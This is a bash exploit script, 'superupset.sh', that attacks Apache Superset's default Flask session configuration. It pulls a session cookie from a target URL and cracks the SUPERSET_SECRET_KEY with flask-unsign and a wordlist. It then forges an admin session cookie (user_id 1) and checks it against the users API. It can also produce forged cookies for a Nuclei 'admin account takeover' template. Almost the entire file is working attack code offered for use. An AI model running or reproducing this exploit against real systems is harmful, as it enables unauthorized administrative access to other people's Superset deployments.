#!/bin/bash

###########################################
#Script Name        : superupset.sh
#Description        : This is a tool focused in exploit the default session configuration of Superset, that is Flask-based, and it dependies of the another tool called flask-unsign (https://github.com/Paradoxis/Flask-Unsign) to prooceed with the cracking SUPERSET_SECRET_KEY and the signing of a valid session cookie after that.
#Author             : icarot (https://github.com/icarot)
#updated            : 06/01/2026
#updated            : 0.9
#Dependencies       : Flask-Unsign (https://github.com/Paradoxis/Flask-Unsign), cURL command (https://curl.se/)
###########################################

#COLOR
_RED="\e[31m";
_GREEN="\e[32m";
_LIGHT_GRAY="\033[0;37m";
_DARK_GRAY="\033[1;30m";
_NOCOLOR="\033[0m";

###########################################
#GLOBAL VARIABLES
_supersetPayload="{'_fresh': True, '_id': 'f6342d140ba68a5c88356844f996e33e23838e895b9b2c5a8fa433b7195482f1de35828446d174cc5aa1781076e62a30ac7bd9740e3aa24fcf7068d9bfe64747', '_user_id': '1', 'csrf_token': 'cc8f99b436f4135c29435cf74293f9ec177935f4', 'locale': 'en'}";

if [[ -e "${PWD}/default_SUPERSET_SECRET_KEY.txt" ]]
then
    _defaultSupersetSecretKey="${PWD}/default_SUPERSET_SECRET_KEY.txt";
fi

if [[ -e "${PWD}/template-apache-superset-adminaccounttakeover.yaml" ]]
then
    _templateNuclei="${PWD}/template-apache-superset-adminaccounttakeover.yaml";
fi

_defaultSupersetSecretKeySessionCookie="${PWD}/defaultSupersetSecretKeySessionCookie.txt";

###########################################
#FUNCTIONS
bannerScript() {

echo -e "
███████╗██╗   ██╗██████╗ ███████╗██████╗  ██╗██╗   ██╗██████╗ ██╗ ███████╗███████╗████████╗
██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██╔╝██║   ██║██╔══██╗╚██╗██╔════╝██╔════╝╚══██╔══╝
███████╗██║   ██║██████╔╝█████╗  ██████╔╝██║ ██║   ██║██████╔╝ ██║███████╗█████╗     ██║   
╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██║ ██║   ██║██╔═══╝  ██║╚════██║██╔══╝     ██║   
███████║╚██████╔╝██║     ███████╗██║  ██║╚██╗╚██████╔╝██║     ██╔╝███████║███████╗   ██║   
╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚══════╝╚══════╝   ╚═╝   
                                                                                           
Developed by icarot.\n"

}

###########################################

helpMenu(){
    #usage: helpMenu
    echo -e "${_GREEN}[INFO] Usage:${_NOCOLOR}";
    echo -e "${_GREEN}[USAGE] Craking cookie:\n${_LIGHT_GRAY}$0 http://<IP_ADDRESS>:<PORT> <WORDLIST> --crack${_NOCOLOR}";
    echo -e "${_GREEN}[USAGE] Sign new valid cookie:\n${_LIGHT_GRAY}$0 http://<IP_ADDRESS>:<PORT> <WORDLIST> --sign${_NOCOLOR}";
    echo -e "${_GREEN}[USAGE] Proceed with all steps:\n${_LIGHT_GRAY}$0 http://<IP_ADDRESS>:<PORT> <WORDLIST> --all${_NOCOLOR}";
    echo -e "${_GREEN}[USAGE] Generates the Nuclei's template "apache-superset-adminaccounttakeover.yaml" with fresh valid session cookies made with well-known default password on SUPERSET_SECRET_KEY:\n${_LIGHT_GRAY}$0${_NOCOLOR}\n";
}

###########################################


checkParam() {
    #usage: checkParam "$1" "$2" "$3"
if [[ "$1" != "" ]]
then
    _URL="$1";
    echo -e "${_GREEN}[INFO] URL to verify: ${_URL}${_NOCOLOR}";
    if [[ "$2" != "" ]]
    then
        _WORDLIST="$2";
        if [[ "$3" != "" ]]
        then
            _optionMode="$3";
        else
            echo -e "${_RED}[ERROR] Inform the correct mode to use.${_NOCOLOR}";
            helpMenu
            exit 3
        fi
    else
        echo -e "${_RED}[ERROR] Inform the wordlist to use in the bruteforce.${_NOCOLOR}";
        exit 2
    fi
else
    echo -e "${_RED}[ERROR] Inform the URL to test. Using the following URL format: http://<IP_ADDRESS>:<PORT>${_NOCOLOR}";

    helpMenu
    generateNucleiTemplate "${_defaultSupersetSecretKey}" "${_supersetPayload}" "${_defaultSupersetSecretKeySessionCookie}" "${_templateNuclei}"
    exit 1
fi

}
###########################################
installationCheck(){
    #usage: installationCheck
    echo -e "${_GREEN}[INFO] Checking the dependencies to run: ${_NOCOLOR}";

    if [[ -e $(which curl) ]]
    then 
        echo -e "${_GREEN}[INFO] Tool cUrl installed..............OK ${_NOCOLOR}";
    else 
        echo -e "${_RED}[ERROR] Please execute the following command:\n apt install curl -y${_NOCOLOR}";
        exit 4
    fi

    if [[ -e $(which flask-unsign) ]]
    then 
        echo -e "${_GREEN}[INFO] Tool flask-unsign installed......OK ${_NOCOLOR}";
    else 
        echo -e "${_RED}[ERROR] Please execute the following command:\n pip3 install flask-unsign --break-system-packages${_NOCOLOR}";
        exit 5
    fi

}
###########################################
obtainingSessionCookie(){
    #usage: _sessionCookie=$(obtainingSessionCookie <_URL>)
    _URL="$1";
    
    _cookie_to_crack=$(curl -skX HEAD -I ${_URL}/login/?next=%2Fsuperset%2Fwelcome%2F -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" | grep "Set-Cookie" | awk '{print $2}' | sed 's/;//g' | cut -d"=" -f2);

    echo ${_cookie_to_crack};
}
###########################################
crackSupersetSecretKey(){
    #usage: _supersetSecretKey=$(crackSupersetSecretKey <_WORDLIST> <_sessionCookie>)
    _WORDLIST="$1";
    _cookieToCrack="$2";

    _cracked_SUPERSET_SECRET_KEY_temp=$(flask-unsign --unsign --wordlist ${_WORDLIST} --cookie "${_cookieToCrack}" --no-literal-eval --quiet);
    _cracked_SUPERSET_SECRET_KEY=$(echo ${_cracked_SUPERSET_SECRET_KEY_temp} | sed "s/b'//" | sed "s/'//");

    echo ${_cracked_SUPERSET_SECRET_KEY};
}
###########################################
signSupersetSecretKey(){
    #usage: _validAdminCookieSession=$(signSupersetSecretKey <SUPERSET_SECRET_KEY> <_supersetPayload>)
    _crackedSupersetSecretKey="$1";
    _supersetPayload="$2";
    
    _valid_session=$(flask-unsign --sign --cookie "${_supersetPayload}" --secret "${_crackedSupersetSecretKey}" --salt "cookie-session" --no-literal-eval);

    echo ${_valid_session};
}

validatingSessionCookie(){
    #usage: _responseTest=$(validatingSessionCookie <_validAdminCookieSession> <_URL>)
    _valid_session="$1";
    _URL="$2";

    _response_test=$(curl -S -s -k -X "GET" --cookie "session=${_valid_session}" "${_URL}/api/v1/security/users/");

    echo ${_response_test};
}

generateNucleiTemplate(){
    #usage: generateNucleiTemplate <_defaultSupersetSecretKey> <_supersetPayload> <_defaultSupersetSecretKeySessionCookie> <_templateNuclei>
    _defaultSupersetSecretKey="$1";
    _supersetPayload="$2";
    _defaultSupersetSecretKeySessionCookie="$3";
    _templateNuclei=""$4;

    echo "" > "${_defaultSupersetSecretKeySessionCookie}";

    if [[ -e "${_defaultSupersetSecretKey}" ]]
    then
        echo -e "${_GREEN}[INFO] Alternativelly, we are generating new session cookie using the wordlist: ${_defaultSupersetSecretKey} ${_URL}${_NOCOLOR}\n";
        for _password in $(cat ${_defaultSupersetSecretKey});
        do
            echo -e "${_GREEN}[INFO] Sign a new session cookie with the SUPERSET_SECRET_KEY: ${_password}${_NOCOLOR}";
            _validAdminCookieSession=$(signSupersetSecretKey "${_password}" "${_supersetPayload}")
            echo "${_validAdminCookieSession}";
            echo "${_validAdminCookieSession}" >> "${_defaultSupersetSecretKeySessionCookie}";
        done;

        if [[ -e "${_defaultSupersetSecretKeySessionCookie}" ]]
        then
            echo -e "${_GREEN}[INFO] Please see also the new default: ${_defaultSupersetSecretKeySessionCookie}${_NOCOLOR}";

            _helpersDir=$(find . -type d -iname "helpers" | grep "nuclei-templates"| sed 's/.//');

            if [[ -e "${_helpersDir}/payloads/" ]]
            then
                cp "${_defaultSupersetSecretKeySessionCookie}" "${_helpersDir}/payloads/"
                echo -e "${_GREEN}[INFO] You can execute the following command:\n${_LIGHT_GRAY} ~/go/bin/nuclei -t template-apache-superset-adminaccounttakeover.yaml -u \"http://<IP_ADDRESS>:<PORT>\" -H \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\" -V token=${_helpersDir}/payloads/${_defaultSupersetSecretKeySessionCookie} ${_NOCOLOR}";
            fi
        fi
    else
        echo -e "${_RED}[ERROR] The file ${_defaultSupersetSecretKey} does not exist. Interrupting the default session token generation.${_NOCOLOR}";
    fi
}

###########################################
executionMode() {
    case ${_optionMode} in
        --crack | -c)
            echo -e "${_GREEN}[INFO] Executing steps until crack (mode: Crack) - $0${_NOCOLOR}";
            #Obtaing Session Cookie to Crack
            _sessionCookie=$(obtainingSessionCookie "${_URL}");
            echo -e "${_GREEN}[INFO] Obtained cookie in the URL ${_URL}/login/?next=%2Fsuperset%2Fwelcome%2F:\n${_NOCOLOR}${_LIGHT_GRAY}${_sessionCookie}${_NOCOLOR}";

            #Bruteforce the session cookie to find the SUPERSET_SECRET_KEY
            _supersetSecretKey=$(crackSupersetSecretKey "$_WORDLIST" "${_sessionCookie}");
            echo -e "${_GREEN}[INFO] Cracked SUPERSET_SECRET_KEY:\n${_NOCOLOR}${_LIGHT_GRAY}${_supersetSecretKey}${_NOCOLOR}";
        ;;
        --sign | -s)
            echo -e "${_GREEN}[INFO] Executing steps until sign (mode: Sign) - $0${_NOCOLOR}";
            #Obtaing Session Cookie to Crack
            _sessionCookie=$(obtainingSessionCookie "${_URL}");
            echo -e "${_GREEN}[INFO] Obtained cookie in the URL ${_URL}/login/?next=%2Fsuperset%2Fwelcome%2F:\n${_NOCOLOR}${_LIGHT_GRAY}${_sessionCookie}${_NOCOLOR}";

            #Bruteforce the session cookie to find the SUPERSET_SECRET_KEY
            _supersetSecretKey=$(crackSupersetSecretKey "$_WORDLIST" "${_sessionCookie}");
            echo -e "${_GREEN}[INFO] Cracked SUPERSET_SECRET_KEY:\n${_NOCOLOR}${_LIGHT_GRAY}${_supersetSecretKey}${_NOCOLOR}";

            #Generate a new session cookie with the SUPERSET_SECRET_KEY found
            _validAdminCookieSession=$(signSupersetSecretKey "${_supersetSecretKey}" "${_supersetPayload}");
            echo -e "${_GREEN}[INFO] Possible valid admin session cookie:\n${_NOCOLOR}${_LIGHT_GRAY}${_validAdminCookieSession}${_NOCOLOR}";
        ;;
        --all | -a)
            echo -e "${_GREEN}[INFO] Executing all steps from (mode: All) - $0${_NOCOLOR}";
            #Obtaing Session Cookie to Crack
            _sessionCookie=$(obtainingSessionCookie "${_URL}");
            echo -e "${_GREEN}[INFO] Obtained cookie in the URL ${_URL}/login/?next=%2Fsuperset%2Fwelcome%2F:\n${_NOCOLOR}${_LIGHT_GRAY}${_sessionCookie}${_NOCOLOR}";

            #Bruteforce the session cookie to find the SUPERSET_SECRET_KEY
            _supersetSecretKey=$(crackSupersetSecretKey "$_WORDLIST" "${_sessionCookie}");
            echo -e "${_GREEN}[INFO] Cracked SUPERSET_SECRET_KEY:\n${_NOCOLOR}${_LIGHT_GRAY}${_supersetSecretKey}${_NOCOLOR}";

            #Generate a new session cookie with the SUPERSET_SECRET_KEY found
            _validAdminCookieSession=$(signSupersetSecretKey "${_supersetSecretKey}" "${_supersetPayload}");
            echo -e "${_GREEN}[INFO] Possible valid admin session cookie:\n${_NOCOLOR}${_LIGHT_GRAY}${_validAdminCookieSession}${_NOCOLOR}";

            #Validating the new session cookie generated.
            _responseTest=$(validatingSessionCookie "${_validAdminCookieSession}" "${_URL}");
            echo -e "${_GREEN}[INFO] Curl command:\n${_NOCOLOR}${_LIGHT_GRAY} curl -S -s -k -X $'GET' -b $'session=${_validAdminCookieSession}' $'${_URL}/api/v1/security/users/'${_NOCOLOR}";
            echo -e "${_GREEN}[INFO] Curl command alternative (Superset version <= 5.0.0):\n${_NOCOLOR}${_LIGHT_GRAY}curl -S -s -k -X $'GET' -b $'session=${_validAdminCookieSession}' $'${_URL}/users/list/'${_NOCOLOR}";
            echo -e "${_GREEN}[INFO] Response to try access the URL '${_URL}/api/v1/security/users/':${_NOCOLOR}\n${_LIGHT_GRAY}${_responseTest}${_NOCOLOR}";
        ;;
        *)
            helpMenu
            generateNucleiTemplate
            exit 1
        ;;
    esac
}

###########################################
#MAIN
bannerScript
installationCheck
checkParam "$1" "$2" "$3"
executionMode
